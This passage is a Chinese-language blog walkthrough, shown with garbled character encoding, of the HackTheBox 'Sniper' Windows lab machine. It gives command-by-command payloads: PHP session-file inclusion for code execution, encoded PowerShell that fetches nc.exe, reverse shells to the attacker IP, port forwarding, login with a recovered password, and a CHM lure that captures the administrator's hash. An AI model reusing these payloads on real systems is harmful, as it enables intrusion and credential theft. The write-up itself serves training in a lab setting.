        <content type="html"><![CDATA[<p>å¥½ä¹…æ²¡åšhtbçš„é¶æœºï¼Œè¿™æ¬¡åˆè·Ÿç€ç€å¤§ä½¬çš„æ€è·¯å»åšäº†ä¸€å°æ–°çš„é¶æœºã€‚ä¸åŒä»¥å¾€çš„æ˜¯,è¿™æ¬¡çš„é¶æœºSniperæ˜¯windowsé¶æœºï¼Œå› æ­¤ä¹Ÿæ”¶è·äº†è®¸å¤šæ–°å§¿åŠ¿ã€‚å°±æ˜¯åœ¨ä¸­é—´ä»githubä¸‹äº†ä¸å°‘ä¸œè¥¿â€¦â€¦å› ä¸ºä¸æ˜¯å‡æœŸï¼Œå…·ä½“è¿‡ç¨‹ä¸ä¼šåƒä»¥å¾€é‚£ä¹ˆè¯¦ç»†ã€‚åŒæ—¶windowsé¶æœºä¸‹è‡ªå·±ä¸å¤ªç†è§£çš„ä¸œè¥¿ä¹Ÿå¸Œæœ›ä¸ä¼šç»™åˆ«äººå¸¦è¿›è¯¯åŒºã€‚<br>æœ‰è¶£çš„æ˜¯,è¿™å°é¶æœºè·å¾—webrootçš„shellæœ‰ä¸åŒçš„æ“ä½œæ–¹æ³•ï¼ŒåŒæ—¶å…·ä½“åé¢ææƒæ—¶ä¹Ÿå°†æœ‰ä¸åŒçš„æ–¹æ³•è¿›è¡Œç»†èŠ‚ä¸Šä¸åŒçš„æ“ä½œã€‚å…·ä½“ç»†èŠ‚å°†åœ¨åé¢çš„æ–‡ç« ä¸­æåˆ°ã€‚</p><a id="more"></a><p><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/-1.PNG" class="lazyload" data-srcset="-1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ”»å‡»æœºipï¼š kalilinux 10.10.15.189<br>é¶æœºip windows10 10.10.10.151 </p><h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><p>é¦–å…ˆæ˜¯è€å¥—çš„ç«¯å£æ‰«æ</p><pre><code class="bash">Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-01 09:20 CSTNmap scan report for 10.10.10.151Host is up (0.24s latency).Not shown: 996 filtered portsPORT    STATE SERVICE       VERSION80/tcp  open  http          Microsoft IIS httpd 10.0| http-methods: |_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: Sniper Co.135/tcp open  msrpc         Microsoft Windows RPC139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn445/tcp open  microsoft-ds?Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: 7h02m38s| smb2-security-mode: |   2.02: |_    Message signing enabled but not required| smb2-time: |   date: 2020-04-01T08:23:29|_  start_date: N/A</code></pre><p>å¯ä»¥çœ‹åˆ°æ˜¯ä¸€å°windowsé¶æœºï¼Œé…æœ‰IISæœåŠ¡ã€‚ä¸è¿‡å¼€å¯çš„å‡ ä¸ªç«¯å£ä¸­åŒ…å«äº†445ç«¯å£,è¿™æ˜¯SMBæœåŠ¡å¼€æ”¾çš„ç«¯å£ã€‚</p><blockquote><p>port 445: Microsoft Windows SMB Serverè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</p></blockquote><p>è‘—åçš„æ°¸æ’ä¹‹è“æ¼æ´ä¹Ÿæ˜¯é€šè¿‡è¿™ä¸€ç«¯å£åˆ©ç”¨çš„ã€‚å½“ç„¶è¿™é‡Œå¹¶æ²¡æœ‰ä»€ä¹ˆæ¸—é€ç‚¹ï¼Œåªæ˜¯è¯´æ˜æˆ‘ä»¬å¯ä»¥é€šè¿‡smbserverè¿æ¥åˆ°é¶æœº,å°è¯•åŸºæœ¬çš„smbè¿æ¥çš„è¯å‘ç°å¿…ç„¶æ˜¯è¦å¯†ç çš„ã€‚</p><p>é‚£ä¹ˆè¿˜æ˜¯ä»80ç«¯å£å…¥æ‰‹ã€‚è®¿é—®ç½‘é¡µï¼Œå‘ç°æ˜¯phpç½‘é¡µã€‚IIS+phpå®é™…ä¸Šæ˜¯éå¸¸å¥‡æ€ªçš„é…ç½®,ä½†æˆ‘ä»¬æ˜¾ç„¶å¯ä»¥ä»¥æ­¤ä¸ºå…¥æ‰‹ç‚¹ã€‚</p><h2 id="LFI-RFI-gt-å‘½ä»¤æ‰§è¡Œ-gt-webshell"><a href="#LFI-RFI-gt-å‘½ä»¤æ‰§è¡Œ-gt-webshell" class="headerlink" title="LFI/RFI=&gt;å‘½ä»¤æ‰§è¡Œ=&gt;webshell"></a>LFI/RFI=&gt;å‘½ä»¤æ‰§è¡Œ=&gt;webshell</h2><p>é¦–å…ˆåœ¨blogä¸‹å‘ç°ä¸€ä¸ªè¯­è¨€åˆ‡æ¢åŠŸèƒ½ï¼Œå…¶å‚æ•°å¯ä»¥æ–‡ä»¶åŒ…å«ã€‚<code>/blog?lang=blog-en.php</code><br>å°è¯•ä¼ªåè®®ç­‰å¸¸è§„å¥—è·¯è¯»æºç å‡ä»¥å¤±è´¥å‘Šç»ˆã€‚<br>ç®€å•è¯»windowsçš„æ–‡ä»¶<code>?lang=/windows/system32/license.rtf</code><br>å‘ç°æœ‰å›æ˜¾ã€‚é‚£ä¹ˆç°åœ¨ç›®çš„æ˜¯å¾—åˆ°ä¸€ä¸ªweb-rootçš„shellï¼Œå¦‚ä½•æ“ä½œå‘¢ï¼Ÿ<br>æ­¤æ—¶æœ‰ä¸€ç§ç›¸å¯¹â€ç®€å•â€çš„åŠæ³•,åˆ©ç”¨ä¸Šé¢æåˆ°çš„æ˜¯smbæœåŠ¡ã€‚æˆ‘ä»¬å†æœ¬æœºkaliæ–°å»ºä¸€ä¸ªsmbæœåŠ¡ï¼Œç„¶åç›´æ¥rfiè¿›è¡Œæ“ä½œã€‚<br>RFIçš„åŸºæœ¬æ“ä½œå¥—è·¯å¦‚ä¸‹</p><pre><code>/?lang=\\10.10.14.62\share\foo.php</code></pre><p>ä½†æ˜¯éœ€è¦æ³¨æ„ã€‚æƒ³é€šè¿‡SMBè¾¾æˆrfiæˆ‘ä»¬å¿…é¡»ä¿®æ”¹æœ¬æœºçš„æ˜¯smbæœåŠ¡çš„æƒé™,æ§åˆ¶æ–‡ä»¶å¤¹çš„æƒé™ä¸º777ç­‰ç­‰ï¼Œæ“ä½œèµ·æ¥å¯¹æˆ‘è¿™æ ·çš„å°ç™½è€Œè¨€ç›¸å¯¹å›°éš¾äº†ã€‚é‚£ä¹ˆæœ‰æ²¡æœ‰å…¶ä»–æ–¹æ³•å¾—åˆ°webshellå‘¢?</p><p>æœ‰,è€Œè¿™ä¹Ÿæ˜¯æˆ‘å­¦åˆ°çš„ä¸åŒäºå¸¸è§„å¥—è·¯çš„æ–¹æ³•ã€‚<br>å›åˆ°ä¹‹å‰phpç½‘é¡µçš„æ€è·¯ä¸Šã€‚æœ‰è¿™æ ·çš„ä¸€ä¸ªç»†èŠ‚å¯ä»¥æ³¨æ„ï¼šè¿™æ˜¯ä¸€ä¸ªwindowsé¶æœºçš„phpæœåŠ¡ï¼Œå…¶sessionå€¼è¢«å­˜å‚¨åœ¨å›ºå®šçš„æ–‡ä»¶å¤¹äº†ã€‚<br>æˆ‘ä»¬å°è¯•ä¸€ä¸‹éšæ„æ³¨å†Œä¸€ä¸ªç”¨æˆ·åï¼Œå¹¶ä¸”è®°å½•ä¸‹sessionå€¼ã€‚é€šè¿‡ä¸‹é¢çš„payloadåŒ…å«session</p><pre><code>lang=/Windows/Temp/sess_1d6bfk00vc159thng1t5q521qg</code></pre><p>æ­¤æ—¶æŸ¥çœ‹åŒ…å«çš„ç»“æœï¼Œå‘ç°æ˜¯å«æœ‰ç”¨æˆ·åçš„åºåˆ—åŒ–æ•°æ®ã€‚é‚£ä¹ˆç±»ä¼¼äºä¹‹å‰tp5çš„sessionå›ºå®šå­˜å‚¨ç±»çš„æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥ä»è¿™é‡Œä¸‹æ‰‹ï¼Œå°†phpä»£ç å†™å…¥sessionæ•°æ®ã€‚</p><p>é¦–å…ˆå°è¯•ç®€å•çš„fuzz,å‘ç°ç”¨æˆ·åè¿‡æ»¤äº†ä¸€äº›å…³é”®å­—ã€‚è¿™é‡Œç›´æ¥ç»™å‡ºå¯è¡Œçš„payloadåŠå›æ˜¾</p><pre><code class="php">&lt;?=`whoami`?&gt;lang=/Windows/Temp/sess_1d6bfk00vc159thng1t5q521qgusername|s:13:&quot;nt authority\iusr</code></pre><p>åˆ©ç”¨çŸ­æ ‡ç­¾åŠ åå¼•å·ç›´æ¥æ‰§è¡Œå‘½ä»¤ã€‚å¯ä»¥çœ‹åˆ°æˆåŠŸæ‰§è¡Œwhoamiã€‚<br>æ¥ä¸‹æ¥å¯ä»¥å†™webshell,ä¹Ÿå¯ä»¥ç›´æ¥å‘½ä»¤æ‰§è¡Œã€‚è¿™é‡Œç›´æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p><p>å°è¯•å¸¸è§„çš„powershellåå¼¹shellå¤±è´¥ã€‚ä¹‹åä¼šå‘ç°å¯èƒ½æ˜¯å› ä¸ºpowershellè¿è¡Œåœ¨constraintmodeçš„åŸå› ã€‚ä½†æ˜¯ä¸è¦ç´§ï¼Œåˆ©ç”¨lfi+å‘½ä»¤æ‰§è¡Œæˆ‘ä»¬è¿˜æœ‰å…¶ä»–æ–¹æ³•æ‹¿åˆ°windowsé¶æœºçš„shellã€‚<br>é¦–å…ˆæ‰¾åˆ°æœ¬æœºçš„netcat(å³å¹³æ—¶ä½¿ç”¨çš„nc),æŠŠå®ƒä¼ åˆ°windowsæœºä¸Šã€‚(å½“ç„¶éœ€è¦å…ˆå»ºå¥½wwwæ–‡ä»¶å¤¹,å¹¶æŠŠæœ¬æœºçš„nc.exeå¤åˆ¶åˆ°é‡Œé¢)<br>payload:</p><pre><code class="bash">echo &#39;wget 10.10.15.189/nc.exe -O \windows\temp\exp.exe&#39; | iconv -t utf-16le | base64 -w 0</code></pre><p>å°†å‡†å¤‡å¥½çš„payloadè¿›è¡Œç¼–ç é¿å…è¿‡æ»¤ã€‚<br>æ³¨å†Œæ–°ç”¨æˆ·åä¸º</p><pre><code class="php">&lt;?=`powershell /enc {your encoded  command }`?&gt;</code></pre><p>è¿™é‡Œä½¿ç”¨/encæ˜¯powershellå¯¹åº”çš„è§£ç flag,æ²¡ä½¿ç”¨-encæ˜¯ä¸ºäº†è§£å†³è¿‡æ»¤é—®é¢˜ã€‚<br>ç„¶ååŒ…å«å¯¹åº”çš„ç”¨æˆ·çš„sessionå³å¯æ‰§è¡Œã€‚<br>å†åˆ©ç”¨lfiæ£€æŸ¥æ˜¯å¦å·²ç»æŠŠncä¼ ä¸Šå»äº†<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å¾ˆå¥½ã€‚é‚£ä¹ˆå†è¿›è¡Œåå¼¹shellçš„å‘½ä»¤å§ã€‚<br>payload:</p><pre><code class="bash">echo &#39;c:\windows\temp\exp.exe 10.10.15.189 8899 -e powershell&#39; | iconv -t utf-16le | base64 -w 0</code></pre><p>æœ¬æœºç›‘å¬8899.æµè§ˆå™¨åŒ…å«,å¹¶å¾—åˆ°webshell</p><p><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="user-shell"><a href="#user-shell" class="headerlink" title="user shell"></a>user shell</h2><p>æ‹¿åˆ°webshellåæˆ‘ä»¬é¦–å…ˆæ£€æŸ¥ä¸‹æºç ã€‚å¾ˆå¿«å°±æœ‰æ‰€å‘ç°<br>\user\db.phpä¸­å¯ä»¥å‘ç°ä¸€ä¸ªæ•°æ®åº“çš„å¯†ç <code>36mEAhz/B8xQ~2VM</code>.è€Œä¸”åœ¨Userä¸­å¯ä»¥å‘ç°ç”¨æˆ·Chrisçš„å­˜åœ¨ã€‚<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>ä¸‹é¢å°è¯•æ‹¿åˆ°usershell.<br>è¿™é‡Œå°†å†æ¬¡ç”¨åˆ°æˆ‘ä»¬ä¹‹å‰ä½¿ç”¨è¿‡çš„ç«¯å£è½¬å‘ã€‚ä¸è¿‡éœ€è¦ä¸€ä¸ªå·¥å…·æ¥å¸®åŠ©æˆ‘ä»¬å®ç°ã€‚<br><a href="https://github.com/jpillora/chisel" target="_blank" rel="noopener">https://github.com/jpillora/chisel</a><br>ä»githubreleaseå¤„ä¸‹è½½chiselçš„linuxä¸windowsç‰ˆæœ¬ã€‚åˆ†åˆ«ç”¨äºæœ¬æœºä¸é¶æœºã€‚ç„¶åwgetæŠŠwindowsç‰ˆæœ¬çš„ä¼ è¾“åˆ°é¶æœºä¸Šã€‚</p><pre><code class="bash">kali: chmod +x chisel_linux_amd64./chisel_linux_amd64 server -p 8000 --reverseshell: wget http://10.10.15.189/chisel.exe -O chisel.exeportforwarding: .\chisel.exe client 10.10.15.189:8000 R:5985:127.0.0.1:5985 R:3306:127.0.0.1:3306  </code></pre><p><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å¼€å¯<code>--reverse</code>å…è®¸æˆ‘ä»¬è½¬å‘ç«¯å£ã€‚è€Œæœ€åä¸€æ­¥æˆ‘ä»¬æŠŠ5985ä¸3306ç«¯å£è½¬å‘åˆ°æœ¬åœ°ã€‚5985å¯¹åº”çš„æ˜¯WinRMæœåŠ¡ï¼Œå¯ç”¨äºè¿œç¨‹ç®¡ç†ã€‚æˆ‘ä»¬æŠŠå®ƒè½¬å‘åˆ°æœ¬åœ°åï¼Œå¯ä»¥åˆ©ç”¨å¦ä¸€ä¸ªæ¸—é€å·¥å…·evil-winrmè¿›è¡Œç”¨æˆ·ç™»å½•ã€‚</p><pre><code class="bash">git clone https://github.com/Hackplayers/evil-winrmsudo gem install winrm winrm-fs stringio</code></pre><p>åªéœ€ä¸¤æ­¥å³å¯ä½¿ç”¨ã€‚<br>ç„¶åevil-winrmç»§ç»­ç™»å½•ï¼Œç›´æ¥æœ¬åœ°127.0.0.1å³å¯ã€‚å› ä¸ºæˆ‘ä»¬ç«¯å£å·²ç»è½¬å‘å¥½äº†ã€‚<br><code>./evil-winrm.rb -u chris -p &#39;36mEAhz/B8xQ~2VM&#39; -i 127.0.0.1</code><br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æ‹¿åˆ°usershell.</p><p>ä¹‹æ‰€ä»¥ç”¨è¿™ä¹ˆå¤šå·¥å…·è¿›è¡Œuserçš„ææƒå…¶å®æ˜¯å› ä¸ºè¿™é‡Œæƒ³è¦é€šè¿‡å…¶ä»–æ–¹æ³•å¾—åˆ°usershellè¦å†æ¬¡åå¼¹shell.<br>å¹¶ä¸”æ“ä½œèµ·æ¥æœ‰ç‚¹éº»çƒ¦.è¿™é‡Œæˆ‘ç®€å•æä¸€ä¸‹ï¼Œå°±æ˜¯ç›´æ¥é€šè¿‡powershellå‘½ä»¤åˆ›å»ºä¸€ä¸ªå±äºChrisçš„å˜é‡ï¼Œç„¶åå†åå¼¹shell.</p><pre><code class="bash">$pass = convertto-securestring &#39;36mEAhz/B8xQ~2VM&#39; -asplaintext -force$cred = new-object system.management.automation.pscredential(&quot;sniper\chris&quot;, $pass)invoke-command -computer sniper -scriptblock { whoami } -credential $cred</code></pre><p>å˜é‡æˆåŠŸåˆ›å»ºçš„è¯ï¼Œæœ€åä¸€æ¡å‘½ä»¤çš„å›æ˜¾åº”è¯¥æ˜¯<code>sniper\chris</code><br>ç„¶åä¸‹é¢çš„å‘½ä»¤å¯ä»¥é‡æ–°å¼¹shellï¼Œå¾—åˆ°usershell</p><pre><code class="bash">invoke-command -computer sniper -scriptblock { c:\windows\temp\exp.exe 10.10.15.189 1234 -e powershell.exe } -credential $cred</code></pre><h2 id="rootshell"><a href="#rootshell" class="headerlink" title="rootshell"></a>rootshell</h2><p>é‚£ä¹ˆåˆåˆ°äº†æœ€åçš„rootææƒæ—¶é—´ã€‚<br>åœ¨C:\docsä¸­å¯ä»¥å‘ç°è¿™æ ·ä¸€ä¸ªæœ‰è¶£çš„txt</p><pre><code>  Hi Chris,  Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it.  And I hope that you&#39;ve prepared the documentation for our new app. Drop it here when you&#39;re done with it.  Regards,  Sniper CEO.</code></pre><p>æœ‰æ„æ€ã€‚ä¼¼ä¹åœ¨æç¤ºæˆ‘ä»¬,ä¼ åˆ°è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹çš„ä¸œè¥¿å¯èƒ½ä¼šè¢«CEOæ£€æµ‹ã€‚è¿™ä¹Ÿå°±ç±»ä¼¼xssä¸­æˆ‘ä»¬çš„payloadè¢«æ£€æŸ¥æ—¶å¯ä»¥æ‰“åˆ°adminçš„cookie.è¿™é‡Œæˆ‘ä»¬æ˜¯å¦ä¹Ÿèƒ½é€šè¿‡å¯æ‰§è¡Œæ–‡ä»¶è®©administratoræ£€æŸ¥,æ‹¿åˆ°administratorçš„æƒé™å‘¢ï¼Ÿ<br>åŒæ ·åœ¨Chrisçš„Downloadsç›®å½•ä¸‹æˆ‘ä»¬å‘ç°ä¸€ä¸ªinstructions.chmæ–‡ä»¶ã€‚æ‹¿åˆ°windowsæœ¬æœºæ‰“å¼€,å°†å‘ç°<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/4.5.PNG" class="lazyload" data-srcset="4.5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>é‚£ä¹ˆæˆ‘ä»¬åº”è¯¥å°±æ˜¯è¦ä½¿ç”¨chmæ–‡ä»¶è¿›è¡Œæ“ä½œäº†ã€‚åŒæ—¶åˆ©ç”¨çš„æ€è·¯ä¹Ÿå¤§è‡´æ¸…æ¥šäº†ï¼š</p><pre><code>1.windowsæœ¬æœºä¸‹æ“ä½œç”Ÿæˆchmæ–‡ä»¶2.ä¸Šä¼ chmæ–‡ä»¶,å…¶ä¸­payloadå°†æ‰“åˆ°æœ¬æœº #ç±»ä¼¼xssçš„é“ç†3.ç›‘å¬æœ¬æœºï¼Œå¾—åˆ°administratorä¿¡æ¯ã€‚</code></pre><p>ç®€å•æä¸‹chmæ–‡ä»¶ã€‚å…¶å®å°±æ˜¯htmlæ–‡ä»¶çš„å¸®åŠ©æ–‡ä»¶ç³»ç»Ÿã€‚è€Œä¸”æƒ³è¦æ“ä½œèµ·æ¥å¾ˆç®€å•,åªè¦åœ¨win10ç”µè„‘çš„<code>C:\Program Files (x86)\HTML Help Workshop</code>ä¸­å³å¯æ‰¾åˆ°ã€‚<br>å½“ç„¶æˆ‘ä»¬è¿˜è¦ä»å¾®è½¯å®˜ç½‘ä¸‹è½½æœ€æ–°çš„<a href="https://www.microsoft.com/en-us/download/details.aspx?id=21138" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=21138</a><br>å…ˆåˆ›å»ºä¸€ä¸ªhtmlæ–‡ä»¶</p><pre><code class="javascript">&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hacked by byc_404&lt;/h1&gt;&lt;img src=\\10.10.15.189\htb\23333.jpg/&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>é‡Œé¢çš„srcèµ„æºæŒ‡å‘æˆ‘ä»¬æœ¬æœºä»»æ„èµ„æºï¼Œè¯´ç™½äº†å°±æ˜¯è®©adminè§¦å‘ä¸”æˆ‘ä»¬èƒ½æ”¶åˆ°è¯·æ±‚è€Œå·²ã€‚<br>åœ¨windowsæœ¬æœºä»¥ç®¡ç†å‘˜æƒé™æ‰“å¼€hhw.exeï¼Œåˆ›å»ºtest.hppé¡¹ç›®æ·»åŠ æˆ‘ä»¬åˆšåˆšçš„index.htmlå¹¶ç¼–è¯‘ï¼Œå³å¯ç”Ÿæˆä¸€ä¸ªchmæ–‡ä»¶ã€‚<br>ç„¶åå›åˆ°æœ¬æœº,å…ˆèµ·ä¸€ä¸ªç›‘å¬<br><code>responder -I tun0</code></p><p>wgetä¸Šä¼ æ–‡ä»¶åˆ°docsæ–‡ä»¶å¤¹ä¸‹</p><pre><code class="bash">wget http://10.10.15.189/test.chm -O exp.chm</code></pre><p>å¾ˆå¿«å°±èƒ½æ”¶åˆ°è¯·æ±‚<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è¿™æ˜¯ä¸€ä¸²ç®¡ç†å‘˜å¯†ç çš„hash.åˆ°ç½‘ç«™ä¸Šè§£ç å¯å¾—ç®¡ç†å‘˜å¯†ç <code>butterfly!#1</code>.</p><p>ç„¶åç™»å°è¯•ç™»é™†ã€‚ç”±äºå¼€æ”¾äº†445ç«¯å£ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨smbæœåŠ¡å¯ä»¥ç›´æ¥ç™»å½•ã€‚<br>å½“ç„¶æˆ‘æ²¡æœ‰èµ·smbæœåŠ¡ï¼Œä½¿ç”¨ä¸‹é¢githubä¸Šçš„pythonè„šæœ¬å³å¯æ›¿ä»£ã€‚</p><pre><code>git clone https://github.com/SecureAuthCorp/impacket   pip install .python psexec.py Administrator@10.10.10.151</code></pre><p><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æˆåŠŸæ‹¿åˆ°rootshell.</p><p>å½“ç„¶è¿˜æœ‰ç±»ä¼¼å‰é¢çš„ç›´æ¥åå¼¹rootshellçš„æ–¹æ³•ã€‚å› ä¸ºchmæ–‡ä»¶ç”šè‡³å¯ä»¥æ’å…¥powershellå‘½ä»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥ç”Ÿæˆåå¼¹shellçš„html.è¿™é‡Œç›´æ¥å€Ÿç”¨çœ‹åˆ°çš„dalaoçš„chmã€‚<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æˆ–è€…ä½¿ç”¨powershellå‘½ä»¤ç”Ÿæˆpayload<br><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1" target="_blank" rel="noopener">https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1</a></p><pre><code class="bash">Out-CHM â€“Payload &quot;C:windows\temp\exp.exe 10.10.15.189 6666 -e powershell.exe&quot; â€“HHCPath â€œC:\Program Files (x86)\HTML Help Workshopâ€</code></pre><p>è¿™æ ·å°±èƒ½ç›´æ¥åœ¨administratoræ£€æŸ¥æ—¶åå¼¹åˆ°shell.</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>è¿™æ¬¡windowsé¶æœºçš„ä½“éªŒè¿˜ç®—ä¸é”™ã€‚å› ä¸ºä¸ç†Ÿæ‚‰çš„åŸå› æ¥è§¦äº†ä¸å°‘æ–°çŸ¥è¯†ã€‚æœ‰å¾ˆå¤šç»†èŠ‚è¿˜æ²¡å¼„æ˜ç™½ï¼Œä½†æ˜¯ä¹Ÿå­¦åˆ°äº†ä¸å°‘windowsé¶æœºæ–°çŸ¥è¯†ã€‚çš„ç¡®ï¼ŒCTFer ä¸èƒ½æ€»æ˜¯å¾…åœ¨èˆ’é€‚åŒºã€‚å›½é™…èµ›ä¹Ÿå¥½ï¼Œhtbé¶æœºæ¸—é€ä¹Ÿå¥½ï¼Œéƒ½æ˜¯æ¥è§¦éå›½å†…æ¸—é€çŸ¥è¯†çš„å¤§å¥½é€”å¾„ã€‚æ¯•ç«Ÿä¹Ÿæ‰“äº†ä¸€æ®µæ—¶é—´æ¯”èµ›äº†ï¼Œå›½å†…çš„æ¯”èµ›é™¤äº†å¤§å‹æ¯”èµ›èƒ½æœ‰å¾ˆå¤šæ–°å§¿åŠ¿ä»¥åŠæ–°æƒ³æ³•å­¦ä»¥å¤–ï¼Œå…¶ä»–çš„å‡ºé¢˜æ€è·¯æˆ–è€…èµ›äº‹æ“ä½œéƒ½æ˜¯è€ç”Ÿå¸¸è°ˆï¼Œæ‹˜æ³¥äºphpæˆ–è€…ä¸ªåˆ«trickçš„æ³¥æ½­ä¸­ã€‚è¿™å‡ å¤©å°è¯•äº†javaé¢˜ï¼Œwindowsé¢˜ï¼Œéƒ½ç®—æ˜¯ä¸€ç§çªç ´å¸¸è§„çš„å°è¯•å§ã€‚å¸Œæœ›è‡ªå·±ä¹Ÿèƒ½æˆä¸ºæœ‰æƒ³æ³•çš„CTFerã€‚è€Œä¸æ˜¯ä¸€ä¸ªå•çº¯çš„CTFèµ›æ£.</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> hackthebox </tag>
            
            <tag> pentest </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VolgaCTF2020Qualifierå¤ç°</title>
